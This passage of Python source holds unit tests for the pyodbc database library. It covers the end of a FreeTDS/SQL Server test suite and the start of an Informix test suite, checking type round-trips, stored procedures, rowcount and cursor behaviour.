    def test_version(self):
        self.assertEqual(3, len(pyodbc.version.split('.'))) # 1.3.1 etc.

    #
    # date, time, datetime
    #

    def test_datetime(self):
        value = datetime(2007, 1, 15, 3, 4, 5)

        self.cursor.execute(""create table t1(dt datetime)"")
        self.cursor.execute(""insert into t1 values (?)"", value)

        result = self.cursor.execute(""select dt from t1"").fetchone()[0]
        self.assertEqual(type(value), datetime)
        self.assertEqual(value, result)

    def test_datetime_fraction(self):
        # SQL Server supports milliseconds, but Python's datetime supports nanoseconds, so the most granular datetime
        # supported is xxx000.

        value = datetime(2007, 1, 15, 3, 4, 5, 123000)
     
        self.cursor.execute(""create table t1(dt datetime)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
     
        result = self.cursor.execute(""select dt from t1"").fetchone()[0]
        self.assertEqual(type(value), datetime)
        self.assertEqual(result, value)

    def test_datetime_fraction_rounded(self):
        # SQL Server supports milliseconds, but Python's datetime supports nanoseconds.  pyodbc rounds down to what the
        # database supports.

        full    = datetime(2007, 1, 15, 3, 4, 5, 123456)
        rounded = datetime(2007, 1, 15, 3, 4, 5, 123000)
     
        self.cursor.execute(""create table t1(dt datetime)"")
        self.cursor.execute(""insert into t1 values (?)"", full)
     
        result = self.cursor.execute(""select dt from t1"").fetchone()[0]
        self.assertEqual(type(result), datetime)
        self.assertEqual(result, rounded)

    #
    # ints and floats
    #

    def test_int(self):
        # Issue 226: Failure if there is more than one int?
        value1 =  1234
        value2 = -1234
        self.cursor.execute(""create table t1(n1 int, n2 int)"")
        self.cursor.execute(""insert into t1 values (?, ?)"", value1, value2)
        row = self.cursor.execute(""select n1, n2 from t1"").fetchone()
        self.assertEqual(row.n1, value1)
        self.assertEqual(row.n2, value2)

    def test_negative_int(self):
        value = -1
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(result, value)

    def test_bigint(self):
        input = 3000000000
        self.cursor.execute(""create table t1(d bigint)"")
        self.cursor.execute(""insert into t1 values (?)"", input)
        result = self.cursor.execute(""select d from t1"").fetchone()[0]
        self.assertEqual(result, input)

    def test_float(self):
        value = 1234.567
        self.cursor.execute(""create table t1(n float)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(result, value)

    def test_negative_float(self):
        value = -200
        self.cursor.execute(""create table t1(n float)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result  = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(value, result)


    #
    # stored procedures
    #

    # def test_callproc(self):
    #     ""callproc with a simple input-only stored procedure""
    #     pass

    def test_sp_results(self):
        self.cursor.execute(
            """"""
            Create procedure proc1
            AS
              select top 10 name, id, xtype, refdate
              from sysobjects
            """""")
        rows = self.cursor.execute(""exec proc1"").fetchall()
        self.assertEqual(type(rows), list)
        self.assertEqual(len(rows), 10) # there has to be at least 10 items in sysobjects
        self.assertEqual(type(rows[0].refdate), datetime)


    def test_sp_results_from_temp(self):

        # Note: I've used ""set nocount on"" so that we don't get the number of rows deleted from #tmptable.
        # If you don't do this, you'd need to call nextset() once to skip it.

        self.cursor.execute(
            """"""
            Create procedure proc1
            AS
              set nocount on
              select top 10 name, id, xtype, refdate
              into #tmptable
              from sysobjects

              select * from #tmptable
            """""")
        self.cursor.execute(""exec proc1"")
        self.assertTrue(self.cursor.description is not None)
        self.assertTrue(len(self.cursor.description) == 4)

        rows = self.cursor.fetchall()
        self.assertEqual(type(rows), list)
        self.assertEqual(len(rows), 10) # there has to be at least 10 items in sysobjects
        self.assertEqual(type(rows[0].refdate), datetime)


    def test_sp_results_from_vartbl(self):
        self.cursor.execute(
            """"""
            Create procedure proc1
            AS
              set nocount on
              declare @tmptbl table(name varchar(100), id int, xtype varchar(4), refdate datetime)

              insert into @tmptbl
              select top 10 name, id, xtype, refdate
              from sysobjects

              select * from @tmptbl
            """""")
        self.cursor.execute(""exec proc1"")
        rows = self.cursor.fetchall()
        self.assertEqual(type(rows), list)
        self.assertEqual(len(rows), 10) # there has to be at least 10 items in sysobjects
        self.assertEqual(type(rows[0].refdate), datetime)

    def test_sp_with_dates(self):
        # Reported in the forums that passing two datetimes to a stored procedure doesn't work.
        self.cursor.execute(
            """"""
            if exists (select * from dbo.sysobjects where id = object_id(N'[test_sp]') and OBJECTPROPERTY(id, N'IsProcedure') = 1)
              drop procedure [dbo].[test_sp]
            """""")
        self.cursor.execute(
            """"""
            create procedure test_sp(@d1 datetime, @d2 datetime)
            AS
              declare @d as int
              set @d = datediff(year, @d1, @d2)
              select @d
            """""")
        self.cursor.execute(""exec test_sp ?, ?"", datetime.now(), datetime.now())
        rows = self.cursor.fetchall()
        self.assertTrue(rows is not None)
        self.assertTrue(rows[0][0] == 0)   # 0 years apart

    def test_sp_with_none(self):
        # Reported in the forums that passing None caused an error.
        self.cursor.execute(
            """"""
            if exists (select * from dbo.sysobjects where id = object_id(N'[test_sp]') and OBJECTPROPERTY(id, N'IsProcedure') = 1)
              drop procedure [dbo].[test_sp]
            """""")
        self.cursor.execute(
            """"""
            create procedure test_sp(@x varchar(20))
            AS
              declare @y varchar(20)
              set @y = @x
              select @y
            """""")
        self.cursor.execute(""exec test_sp ?"", None)
        rows = self.cursor.fetchall()
        self.assertTrue(rows is not None)
        self.assertTrue(rows[0][0] == None)   # 0 years apart
        

    #
    # rowcount
    #

    def test_rowcount_delete(self):
        self.assertEqual(self.cursor.rowcount, -1)
        self.cursor.execute(""create table t1(i int)"")
        count = 4
        for i in range(count):
            self.cursor.execute(""insert into t1 values (?)"", i)
        self.cursor.execute(""delete from t1"")
        self.assertEqual(self.cursor.rowcount, count)

    def test_rowcount_nodata(self):
        """"""
        This represents a different code path than a delete that deleted something.

        The return value is SQL_NO_DATA and code after it was causing an error.  We could use SQL_NO_DATA to step over
        the code that errors out and drop down to the same SQLRowCount code.  On the other hand, we could hardcode a
        zero return value.
        """"""
        self.cursor.execute(""create table t1(i int)"")
        # This is a different code path internally.
        self.cursor.execute(""delete from t1"")
        self.assertEqual(self.cursor.rowcount, 0)

    def test_rowcount_select(self):
        """"""
        Ensure Cursor.rowcount is set properly after a select statement.

        pyodbc calls SQLRowCount after each execute and sets Cursor.rowcount, but SQL Server 2005 returns -1 after a
        select statement, so we'll test for that behavior.  This is valid behavior according to the DB API
        specification, but people don't seem to like it.
        """"""
        self.cursor.execute(""create table t1(i int)"")
        count = 4
        for i in range(count):
            self.cursor.execute(""insert into t1 values (?)"", i)
        self.cursor.execute(""select * from t1"")
        self.assertEqual(self.cursor.rowcount, -1)

        rows = self.cursor.fetchall()
        self.assertEqual(len(rows), count)
        self.assertEqual(self.cursor.rowcount, -1)

    #
    # always return Cursor
    #

    # In the 2.0.x branch, Cursor.execute sometimes returned the cursor and sometimes the rowcount.  This proved very
    # confusing when things went wrong and added very little value even when things went right since users could always
    # use: cursor.execute(""..."").rowcount

    def test_retcursor_delete(self):
        self.cursor.execute(""create table t1(i int)"")
        self.cursor.execute(""insert into t1 values (1)"")
        v = self.cursor.execute(""delete from t1"")
        self.assertEqual(v, self.cursor)

    def test_retcursor_nodata(self):
        """"""
        This represents a different code path than a delete that deleted something.

        The return value is SQL_NO_DATA and code after it was causing an error.  We could use SQL_NO_DATA to step over
        the code that errors out and drop down to the same SQLRowCount code.
        """"""
        self.cursor.execute(""create table t1(i int)"")
        # This is a different code path internally.
        v = self.cursor.execute(""delete from t1"")
        self.assertEqual(v, self.cursor)

    def test_retcursor_select(self):
        self.cursor.execute(""create table t1(i int)"")
        self.cursor.execute(""insert into t1 values (1)"")
        v = self.cursor.execute(""select * from t1"")
        self.assertEqual(v, self.cursor)

    #
    # misc
    #

    def test_lower_case(self):
        ""Ensure pyodbc.lowercase forces returned column names to lowercase.""

        # Has to be set before creating the cursor, so we must recreate self.cursor.

        pyodbc.lowercase = True
        self.cursor = self.cnxn.cursor()

        self.cursor.execute(""create table t1(Abc int, dEf int)"")
        self.cursor.execute(""select * from t1"")

        names = [ t[0] for t in self.cursor.description ]
        names.sort()

        self.assertEqual(names, [ ""abc"", ""def"" ])

        # Put it back so other tests don't fail.
        pyodbc.lowercase = False
        
    def test_row_description(self):
        """"""
        Ensure Cursor.description is accessible as Row.cursor_description.
        """"""
        self.cursor = self.cnxn.cursor()
        self.cursor.execute(""create table t1(a int, b char(3))"")
        self.cnxn.commit()
        self.cursor.execute(""insert into t1 values(1, 'abc')"")

        row = self.cursor.execute(""select * from t1"").fetchone()

        self.assertEqual(self.cursor.description, row.cursor_description)
        

    def test_temp_select(self):
        # A project was failing to create temporary tables via select into.
        self.cursor.execute(""create table t1(s char(7))"")
        self.cursor.execute(""insert into t1 values(?)"", ""testing"")
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), str)
        self.assertEqual(v, ""testing"")

        self.cursor.execute(""select s into t2 from t1"")
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), str)
        self.assertEqual(v, ""testing"")


    def test_money(self):
        d = Decimal('123456.78')
        self.cursor.execute(""create table t1(i int identity(1,1), m money)"")
        self.cursor.execute(""insert into t1(m) values (?)"", d)
        v = self.cursor.execute(""select m from t1"").fetchone()[0]
        self.assertEqual(v, d)


    def test_executemany(self):
        self.cursor.execute(""create table t1(a int, b varchar(10))"")

        params = [ (i, str(i)) for i in range(1, 6) ]

        self.cursor.executemany(""insert into t1(a, b) values (?,?)"", params)

        count = self.cursor.execute(""select count(*) from t1"").fetchone()[0]
        self.assertEqual(count, len(params))

        self.cursor.execute(""select a, b from t1 order by a"")
        rows = self.cursor.fetchall()
        self.assertEqual(count, len(rows))

        for param, row in zip(params, rows):
            self.assertEqual(param[0], row[0])
            self.assertEqual(param[1], row[1])


    def test_executemany_one(self):
        ""Pass executemany a single sequence""
        self.cursor.execute(""create table t1(a int, b varchar(10))"")

        params = [ (1, ""test"") ]

        self.cursor.executemany(""insert into t1(a, b) values (?,?)"", params)

        count = self.cursor.execute(""select count(*) from t1"").fetchone()[0]
        self.assertEqual(count, len(params))

        self.cursor.execute(""select a, b from t1 order by a"")
        rows = self.cursor.fetchall()
        self.assertEqual(count, len(rows))

        for param, row in zip(params, rows):
            self.assertEqual(param[0], row[0])
            self.assertEqual(param[1], row[1])
        

    def test_executemany_failure(self):
        """"""
        Ensure that an exception is raised if one query in an executemany fails.
        """"""
        self.cursor.execute(""create table t1(a int, b varchar(10))"")

        params = [ (1, 'good'),
                   ('error', 'not an int'),
                   (3, 'good') ]
        
        self.assertRaises(pyodbc.Error, self.cursor.executemany, ""insert into t1(a, b) value (?, ?)"", params)

        
    def test_row_slicing(self):
        self.cursor.execute(""create table t1(a int, b int, c int, d int)"");
        self.cursor.execute(""insert into t1 values(1,2,3,4)"")

        row = self.cursor.execute(""select * from t1"").fetchone()

        result = row[:]
        self.assertTrue(result is row)

        result = row[:-1]
        self.assertEqual(result, (1,2,3))

        result = row[0:4]
        self.assertTrue(result is row)


    def test_row_repr(self):
        self.cursor.execute(""create table t1(a int, b int, c int, d int)"");
        self.cursor.execute(""insert into t1 values(1,2,3,4)"")

        row = self.cursor.execute(""select * from t1"").fetchone()

        result = str(row)
        self.assertEqual(result, ""(1, 2, 3, 4)"")

        result = str(row[:-1])
        self.assertEqual(result, ""(1, 2, 3)"")

        result = str(row[:1])
        self.assertEqual(result, ""(1,)"")


    def test_concatenation(self):
        v2 = '0123456789' * 30
        v3 = '9876543210' * 30

        self.cursor.execute(""create table t1(c1 int identity(1, 1), c2 varchar(300), c3 varchar(300))"")
        self.cursor.execute(""insert into t1(c2, c3) values (?,?)"", v2, v3)

        row = self.cursor.execute(""select c2, c3, c2 + c3 as both from t1"").fetchone()

        self.assertEqual(row.both, v2 + v3)

    def test_view_select(self):
        # Reported in forum: Can't select from a view?  I think I do this a lot, but another test never hurts.

        # Create a table (t1) with 3 rows and a view (t2) into it.
        self.cursor.execute(""create table t1(c1 int identity(1, 1), c2 varchar(50))"")
        for i in range(3):
            self.cursor.execute(""insert into t1(c2) values (?)"", ""string%s"" % i)
        self.cursor.execute(""create view t2 as select * from t1"")

        # Select from the view
        self.cursor.execute(""select * from t2"")
        rows = self.cursor.fetchall()
        self.assertTrue(rows is not None)
        self.assertTrue(len(rows) == 3)

    def test_autocommit(self):
        self.assertEqual(self.cnxn.autocommit, False)

        othercnxn = pyodbc.connect(self.connection_string, autocommit=True)
        self.assertEqual(othercnxn.autocommit, True)

        othercnxn.autocommit = False
        self.assertEqual(othercnxn.autocommit, False)

    def test_unicode_results(self):
        ""Ensure unicode_results forces Unicode""
        othercnxn = pyodbc.connect(self.connection_string, unicode_results=True)
        othercursor = othercnxn.cursor()

        # ANSI data in an ANSI column ...
        othercursor.execute(""create table t1(s varchar(20))"")
        othercursor.execute(""insert into t1 values(?)"", 'test')

        # ... should be returned as Unicode
        value = othercursor.execute(""select s from t1"").fetchone()[0]
        self.assertEqual(value, u'test')


    def test_sqlserver_callproc(self):
        try:
            self.cursor.execute(""drop procedure pyodbctest"")
            self.cnxn.commit()
        except:
            pass

        self.cursor.execute(""create table t1(s varchar(10))"")
        self.cursor.execute(""insert into t1 values(?)"", ""testing"")

        self.cursor.execute(""""""
                            create procedure pyodbctest @var1 varchar(32)
                            as 
                            begin 
                              select s 
                              from t1 
                            return 
                            end
                            """""")
        self.cnxn.commit()

        # for row in self.cursor.procedureColumns('pyodbctest'):
        #     print row.procedure_name, row.column_name, row.column_type, row.type_name

        self.cursor.execute(""exec pyodbctest 'hi'"")

        # print self.cursor.description
        # for row in self.cursor:
        #     print row.s

    def test_skip(self):
        # Insert 1, 2, and 3.  Fetch 1, skip 2, fetch 3.

        self.cursor.execute(""create table t1(id int)"");
        for i in range(1, 5):
            self.cursor.execute(""insert into t1 values(?)"", i)
        self.cursor.execute(""select id from t1 order by id"")
        self.assertEqual(self.cursor.fetchone()[0], 1)
        self.cursor.skip(2)
        self.assertEqual(self.cursor.fetchone()[0], 4)

    def test_timeout(self):
        self.assertEqual(self.cnxn.timeout, 0) # defaults to zero (off)

        self.cnxn.timeout = 30
        self.assertEqual(self.cnxn.timeout, 30)

        self.cnxn.timeout = 0
        self.assertEqual(self.cnxn.timeout, 0)

    def test_sets_execute(self):
        # Only lists and tuples are allowed.
        def f():
            self.cursor.execute(""create table t1 (word varchar (100))"")
            words = set (['a'])
            self.cursor.execute(""insert into t1 (word) VALUES (?)"", [words])

        self.assertRaises(pyodbc.ProgrammingError, f)

    def test_sets_executemany(self):
        # Only lists and tuples are allowed.
        def f():
            self.cursor.execute(""create table t1 (word varchar (100))"")
            words = set (['a'])
            self.cursor.executemany(""insert into t1 (word) values (?)"", [words])
            
        self.assertRaises(TypeError, f)

    def test_row_execute(self):
        ""Ensure we can use a Row object as a parameter to execute""
        self.cursor.execute(""create table t1(n int, s varchar(10))"")
        self.cursor.execute(""insert into t1 values (1, 'a')"")
        row = self.cursor.execute(""select n, s from t1"").fetchone()
        self.assertNotEqual(row, None)

        self.cursor.execute(""create table t2(n int, s varchar(10))"")
        self.cursor.execute(""insert into t2 values (?, ?)"", row)
        
    def test_row_executemany(self):
        ""Ensure we can use a Row object as a parameter to executemany""
        self.cursor.execute(""create table t1(n int, s varchar(10))"")

        for i in range(3):
            self.cursor.execute(""insert into t1 values (?, ?)"", i, chr(ord('a')+i))

        rows = self.cursor.execute(""select n, s from t1"").fetchall()
        self.assertNotEqual(len(rows), 0)

        self.cursor.execute(""create table t2(n int, s varchar(10))"")
        self.cursor.executemany(""insert into t2 values (?, ?)"", rows)
        
    def test_description(self):
        ""Ensure cursor.description is correct""

        self.cursor.execute(""create table t1(n int, s varchar(8), d decimal(5,2))"")
        self.cursor.execute(""insert into t1 values (1, 'abc', '1.23')"")
        self.cursor.execute(""select * from t1"")

        # (I'm not sure the precision of an int is constant across different versions, bits, so I'm hand checking the
        # items I do know.

        # int
        t = self.cursor.description[0]
        self.assertEqual(t[0], 'n')
        self.assertEqual(t[1], int)
        self.assertEqual(t[5], 0)       # scale
        self.assertEqual(t[6], True)    # nullable

        # varchar(8)
        t = self.cursor.description[1]
        self.assertEqual(t[0], 's')
        self.assertEqual(t[1], str)
        self.assertEqual(t[4], 8)       # precision
        self.assertEqual(t[5], 0)       # scale
        self.assertEqual(t[6], True)    # nullable

        # decimal(5, 2)
        t = self.cursor.description[2]
        self.assertEqual(t[0], 'd')
        self.assertEqual(t[1], Decimal)
        self.assertEqual(t[4], 5)       # precision
        self.assertEqual(t[5], 2)       # scale
        self.assertEqual(t[6], True)    # nullable

        
    def test_none_param(self):
        ""Ensure None can be used for params other than the first""
        # Some driver/db versions would fail if NULL was not the first parameter because SQLDescribeParam (only used
        # with NULL) could not be used after the first call to SQLBindParameter.  This means None always worked for the
        # first column, but did not work for later columns.
        #
        # If SQLDescribeParam doesn't work, pyodbc would use VARCHAR which almost always worked.  However,
        # binary/varbinary won't allow an implicit conversion.

        self.cursor.execute(""create table t1(n int, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (1, 'xyzzy')"")
        row = self.cursor.execute(""select * from t1"").fetchone()
        self.assertEqual(row.n, 1)
        self.assertEqual(type(row.s), str)

        self.cursor.execute(""update t1 set n=?, s=?"", 2, None)
        row = self.cursor.execute(""select * from t1"").fetchone()
        self.assertEqual(row.n, 2)
        self.assertEqual(row.s, None)


    def test_output_conversion(self):
        def convert(value):
            # `value` will be a string.  We'll simply add an X at the beginning at the end.
            return 'X' + value + 'X'
        self.cnxn.add_output_converter(pyodbc.SQL_VARCHAR, convert)
        self.cursor.execute(""create table t1(n int, v varchar(10))"")
        self.cursor.execute(""insert into t1 values (1, '123.45')"")
        value = self.cursor.execute(""select v from t1"").fetchone()[0]
        self.assertEqual(value, 'X123.45X')

        # Now clear the conversions and try again.  There should be no Xs this time.
        self.cnxn.clear_output_converters()
        value = self.cursor.execute(""select v from t1"").fetchone()[0]
        self.assertEqual(value, '123.45')


    def test_too_large(self):
        """"""Ensure error raised if insert fails due to truncation""""""
        value = 'x' * 1000
        self.cursor.execute(""create table t1(s varchar(800))"")
        def test():
            self.cursor.execute(""insert into t1 values (?)"", value)
        self.assertRaises(pyodbc.DataError, test)

    def test_geometry_null_insert(self):
        def convert(value):
            return value

        self.cnxn.add_output_converter(-151, convert) # -151 is SQL Server's geometry
        self.cursor.execute(""create table t1(n int, v geometry)"")
        self.cursor.execute(""insert into t1 values (?, ?)"", 1, None)
        value = self.cursor.execute(""select v from t1"").fetchone()[0]
        self.assertEqual(value, None)
        self.cnxn.clear_output_converters()

    def test_login_timeout(self):
        # This can only test setting since there isn't a way to cause it to block on the server side.
        cnxns = pyodbc.connect(self.connection_string, timeout=2)

    def test_row_equal(self):
        self.cursor.execute(""create table t1(n int, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (1, 'test')"")
        row1 = self.cursor.execute(""select n, s from t1"").fetchone()
        row2 = self.cursor.execute(""select n, s from t1"").fetchone()
        b = (row1 == row2)
        self.assertEqual(b, True)

    def test_row_gtlt(self):
        self.cursor.execute(""create table t1(n int, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (1, 'test1')"")
        self.cursor.execute(""insert into t1 values (1, 'test2')"")
        rows = self.cursor.execute(""select n, s from t1 order by s"").fetchall()
        self.assertTrue(rows[0] < rows[1])
        self.assertTrue(rows[0] <= rows[1])
        self.assertTrue(rows[1] > rows[0])
        self.assertTrue(rows[1] >= rows[0])
        self.assertTrue(rows[0] != rows[1])

        rows = list(rows)
        rows.sort() # uses <
        
    def test_context_manager_success(self):

        self.cursor.execute(""create table t1(n int)"")
        self.cnxn.commit()

        try:
            with pyodbc.connect(self.connection_string) as cnxn:
                cursor = cnxn.cursor()
                cursor.execute(""insert into t1 values (1)"")
        except Exception:
            pass

        cnxn = None
        cursor = None

        rows = self.cursor.execute(""select n from t1"").fetchall()
        self.assertEqual(len(rows), 1)
        self.assertEqual(rows[0][0], 1)


    def test_untyped_none(self):
        # From issue 129
        value = self.cursor.execute(""select ?"", None).fetchone()[0]
        self.assertEqual(value, None)
        
    def test_large_update_nodata(self):
        self.cursor.execute('create table t1(a varbinary(max))')
        hundredkb = bytearray('x'*100*1024)
        self.cursor.execute('update t1 set a=? where 1=0', (hundredkb,))

    def test_func_param(self):
        self.cursor.execute('''
                            create function func1 (@testparam varchar(4)) 
                            returns @rettest table (param varchar(4))
                            as 
                            begin
                                insert @rettest
                                select @testparam
                                return
                            end
                            ''')
        self.cnxn.commit()
        value = self.cursor.execute(""select * from func1(?)"", 'test').fetchone()[0]
        self.assertEqual(value, 'test')
        
    def test_no_fetch(self):
        # Issue 89 with FreeTDS: Multiple selects (or catalog functions that issue selects) without fetches seem to
        # confuse the driver.
        self.cursor.execute('select 1')
        self.cursor.execute('select 1')
        self.cursor.execute('select 1')

def main():
    from optparse import OptionParser
    parser = OptionParser(usage=usage)
    parser.add_option(""-v"", ""--verbose"", action=""count"", help=""Increment test verbosity (can be used multiple times)"")
    parser.add_option(""-d"", ""--debug"", action=""store_true"", default=False, help=""Print debugging items"")
    parser.add_option(""-t"", ""--test"", help=""Run only the named test"")

    (options, args) = parser.parse_args()

    if len(args) > 1:
        parser.error('Only one argument is allowed.  Do you need quotes around the connection string?')

    if not args:
        connection_string = load_setup_connection_string('freetdstests')

        if not connection_string:
            parser.print_help()
            raise SystemExit()
    else:
        connection_string = args[0]

    cnxn = pyodbc.connect(connection_string)
    print_library_info(cnxn)
    cnxn.close()

    suite = load_tests(FreeTDSTestCase, options.test, connection_string)

    testRunner = unittest.TextTestRunner(verbosity=options.verbose)
    result = testRunner.run(suite)


if __name__ == '__main__':

    # Add the build directory to the path so we're testing the latest build, not the installed version.

    add_to_path()

    import pyodbc
    main()
/n/n/ntests2/informixtests.py/n/n#!/usr/bin/python
# -*- coding: latin-1 -*-

usage = """"""\
usage: %prog [options] connection_string

Unit tests for Informix DB.  To use, pass a connection string as the parameter.
The tests will create and drop tables t1 and t2 as necessary.

These run using the version from the 'build' directory, not the version
installed into the Python directories.  You must run python setup.py build
before running the tests.

You can also put the connection string into a tmp/setup.cfg file like so:

  [informixtests]
  connection-string=DRIVER={IBM INFORMIX ODBC DRIVER (64-bit)};SERVER=localhost;UID=uid;PWD=pwd;DATABASE=db
""""""

import sys, os, re
import unittest
from decimal import Decimal
from datetime import datetime, date, time
from os.path import join, getsize, dirname, abspath
from testutils import *

_TESTSTR = '0123456789-abcdefghijklmnopqrstuvwxyz-'

def _generate_test_string(length):
    """"""
    Returns a string of `length` characters, constructed by repeating _TESTSTR as necessary.

    To enhance performance, there are 3 ways data is read, based on the length of the value, so most data types are
    tested with 3 lengths.  This function helps us generate the test data.

    We use a recognizable data set instead of a single character to make it less likely that ""overlap"" errors will
    be hidden and to help us manually identify where a break occurs.
    """"""
    if length <= len(_TESTSTR):
        return _TESTSTR[:length]

    c = (length + len(_TESTSTR)-1) / len(_TESTSTR)
    v = _TESTSTR * c
    return v[:length]

class InformixTestCase(unittest.TestCase):

    SMALL_FENCEPOST_SIZES = [ 0, 1, 255, 256, 510, 511, 512, 1023, 1024, 2047, 2048, 4000 ]
    LARGE_FENCEPOST_SIZES = [ 4095, 4096, 4097, 10 * 1024, 20 * 1024 ]

    ANSI_FENCEPOSTS    = [ _generate_test_string(size) for size in SMALL_FENCEPOST_SIZES ]
    UNICODE_FENCEPOSTS = [ unicode(s) for s in ANSI_FENCEPOSTS ]
    IMAGE_FENCEPOSTS   = ANSI_FENCEPOSTS + [ _generate_test_string(size) for size in LARGE_FENCEPOST_SIZES ]

    def __init__(self, method_name, connection_string):
        unittest.TestCase.__init__(self, method_name)
        self.connection_string = connection_string

    def setUp(self):
        self.cnxn   = pyodbc.connect(self.connection_string)
        self.cursor = self.cnxn.cursor()

        for i in range(3):
            try:
                self.cursor.execute(""drop table t%d"" % i)
                self.cnxn.commit()
            except:
                pass

        for i in range(3):
            try:
                self.cursor.execute(""drop procedure proc%d"" % i)
                self.cnxn.commit()
            except:
                pass

        try:
            self.cursor.execute('drop function func1')
            self.cnxn.commit()
        except:
            pass

        self.cnxn.rollback()

    def tearDown(self):
        try:
            self.cursor.close()
            self.cnxn.close()
        except:
            # If we've already closed the cursor or connection, exceptions are thrown.
            pass

    def test_multiple_bindings(self):
        ""More than one bind and select on a cursor""
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""insert into t1 values (?)"", 1)
        self.cursor.execute(""insert into t1 values (?)"", 2)
        self.cursor.execute(""insert into t1 values (?)"", 3)
        for i in range(3):
            self.cursor.execute(""select n from t1 where n < ?"", 10)
            self.cursor.execute(""select n from t1 where n < 3"")
        

    def test_different_bindings(self):
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""create table t2(d datetime)"")
        self.cursor.execute(""insert into t1 values (?)"", 1)
        self.cursor.execute(""insert into t2 values (?)"", datetime.now())

    def test_drivers(self):
        p = pyodbc.drivers()
        self.assertTrue(isinstance(p, list))

    def test_datasources(self):
        p = pyodbc.dataSources()
        self.assertTrue(isinstance(p, dict))

    def test_getinfo_string(self):
        value = self.cnxn.getinfo(pyodbc.SQL_CATALOG_NAME_SEPARATOR)
        self.assertTrue(isinstance(value, str))

    def test_getinfo_bool(self):
        value = self.cnxn.getinfo(pyodbc.SQL_ACCESSIBLE_TABLES)
        self.assertTrue(isinstance(value, bool))

    def test_getinfo_int(self):
        value = self.cnxn.getinfo(pyodbc.SQL_DEFAULT_TXN_ISOLATION)
        self.assertTrue(isinstance(value, (int, long)))

    def test_getinfo_smallint(self):
        value = self.cnxn.getinfo(pyodbc.SQL_CONCAT_NULL_BEHAVIOR)
        self.assertTrue(isinstance(value, int))

    def test_noscan(self):
        self.assertEqual(self.cursor.noscan, False)
        self.cursor.noscan = True
        self.assertEqual(self.cursor.noscan, True)

    def test_guid(self):
        self.cursor.execute(""create table t1(g1 uniqueidentifier)"")
        self.cursor.execute(""insert into t1 values (newid())"")
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), str)
        self.assertEqual(len(v), 36)

    def test_nextset(self):
        self.cursor.execute(""create table t1(i int)"")
        for i in range(4):
            self.cursor.execute(""insert into t1(i) values(?)"", i)

        self.cursor.execute(""select i from t1 where i < 2 order by i; select i from t1 where i >= 2 order by i"")
        
        for i, row in enumerate(self.cursor):
            self.assertEqual(i, row.i)

        self.assertEqual(self.cursor.nextset(), True)

        for i, row in enumerate(self.cursor):
            self.assertEqual(i + 2, row.i)

    def test_fixed_unicode(self):
        value = u""t\xebsting""
        self.cursor.execute(""create table t1(s nchar(7))"")
        self.cursor.execute(""insert into t1 values(?)"", u""t\xebsting"")
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), unicode)
        self.assertEqual(len(v), len(value)) # If we alloc'd wrong, the test below might work because of an embedded NULL
        self.assertEqual(v, value)


    def _test_strtype(self, sqltype, value, colsize=None):
        """"""
        The implementation for string, Unicode, and binary tests.
        """"""
        assert colsize is None or (value is None or colsize >= len(value))

        if colsize:
            sql = ""create table t1(s %s(%s))"" % (sqltype, colsize)
        else:
            sql = ""create table t1(s %s)"" % sqltype

        self.cursor.execute(sql)
        self.cursor.execute(""insert into t1 values(?)"", value)
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), type(value))

        if value is not None:
            self.assertEqual(len(v), len(value))

        self.assertEqual(v, value)

        # Reported by Andy Hochhaus in the pyodbc group: In 2.1.7 and earlier, a hardcoded length of 255 was used to
        # determine whether a parameter was bound as a SQL_VARCHAR or SQL_LONGVARCHAR.  Apparently SQL Server chokes if
        # we bind as a SQL_LONGVARCHAR and the target column size is 8000 or less, which is considers just SQL_VARCHAR.
        # This means binding a 256 character value would cause problems if compared with a VARCHAR column under
        # 8001. We now use SQLGetTypeInfo to determine the time to switch.
        #
        # [42000] [Microsoft][SQL Server Native Client 10.0][SQL Server]The data types varchar and text are incompatible in the equal to operator.

        self.cursor.execute(""select * from t1 where s=?"", value)


    def _test_strliketype(self, sqltype, value, colsize=None):
        """"""
        The implementation for text, image, ntext, and binary.

        These types do not support comparison operators.
        """"""
        assert colsize is None or (value is None or colsize >= len(value))

        if colsize:
            sql = ""create table t1(s %s(%s))"" % (sqltype, colsize)
        else:
            sql = ""create table t1(s %s)"" % sqltype

        self.cursor.execute(sql)
        self.cursor.execute(""insert into t1 values(?)"", value)
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), type(value))

        if value is not None:
            self.assertEqual(len(v), len(value))

        self.assertEqual(v, value)


    #
    # varchar
    #

    def test_varchar_null(self):
        self._test_strtype('varchar', None, 100)

    # Generate a test for each fencepost size: test_varchar_0, etc.
    def _maketest(value):
        def t(self):
            self._test_strtype('varchar', value, len(value))
        return t
    for value in ANSI_FENCEPOSTS:
        locals()['test_varchar_%s' % len(value)] = _maketest(value)

    def test_varchar_many(self):
        self.cursor.execute(""create table t1(c1 varchar(300), c2 varchar(300), c3 varchar(300))"")

        v1 = 'ABCDEFGHIJ' * 30
        v2 = '0123456789' * 30
        v3 = '9876543210' * 30

        self.cursor.execute(""insert into t1(c1, c2, c3) values (?,?,?)"", v1, v2, v3);
        row = self.cursor.execute(""select c1, c2, c3, len(c1) as l1, len(c2) as l2, len(c3) as l3 from t1"").fetchone()

        self.assertEqual(v1, row.c1)
        self.assertEqual(v2, row.c2)
        self.assertEqual(v3, row.c3)

    def test_varchar_upperlatin(self):
        self._test_strtype('varchar', '�')

    #
    # unicode
    #

    def test_unicode_null(self):
        self._test_strtype('nvarchar', None, 100)

    # Generate a test for each fencepost size: test_unicode_0, etc.
    def _maketest(value):
        def t(self):
